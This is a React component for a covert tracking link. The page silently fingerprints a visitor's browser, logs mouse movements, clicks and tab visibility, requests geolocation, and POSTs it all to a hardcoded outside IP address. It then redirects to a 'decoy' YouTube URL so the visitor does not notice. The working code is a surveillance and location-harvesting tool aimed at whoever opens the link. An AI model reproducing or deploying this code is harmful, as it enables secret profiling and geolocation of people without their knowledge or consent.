import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";


export default function DeepTrackPage() {
  const { id } = useParams();
  const [redirectUrl, setRedirectUrl] = useState(null);

  useEffect(() => {
    const startTime = Date.now();

    // Browser fingerprint
    const fingerprint = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screen: `${window.screen.width}x${window.screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      touchSupport: navigator.maxTouchPoints > 0,
      dnt: navigator.doNotTrack,
    };

    // Mouse & visibility tracking
    const events = [];
    const captureEvent = (e) => {
      events.push({ type: e.type, x: e.clientX, y: e.clientY, time: Date.now() });
    };
    window.addEventListener("mousemove", captureEvent);
    window.addEventListener("click", captureEvent);
    document.addEventListener("visibilitychange", () => {
      events.push({ type: "visibility", visible: document.visibilityState, time: Date.now() });
    });

    // Fetch the decoy URL from backend
    fetch(`http://13.214.77.124:8080/api/generate`) // (Optional: add backend /api/decoy/:id endpoint if needed)
      .then(() => {
        // Simulate redirect URL lookup from linkStore
        // In real-world you'd need a dedicated /api/link/:id endpoint
        return { decoyUrl: "https://youtube.com" }; // Replace this if you implement backend lookup
      })
      .then((res) => {
        const decoyUrl = res.decoyUrl;
        setRedirectUrl(decoyUrl);

        const sendReport = (geo = null) => {
          fetch("http://13.214.77.124:8080/api/track", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              id,
              fingerprint,
              geo,
              events,
              duration: Date.now() - startTime,
            }),
          });
        };

        navigator.geolocation.getCurrentPosition(
          (pos) => sendReport(pos.coords),
          () => sendReport(null),
          { timeout: 1000 }
        );

        setTimeout(() => {
          window.location.href = decoyUrl;
        }, 3000);
      });

    return () => {
      window.removeEventListener("mousemove", captureEvent);
      window.removeEventListener("click", captureEvent);
    };
  }, [id]);

  return null;
}
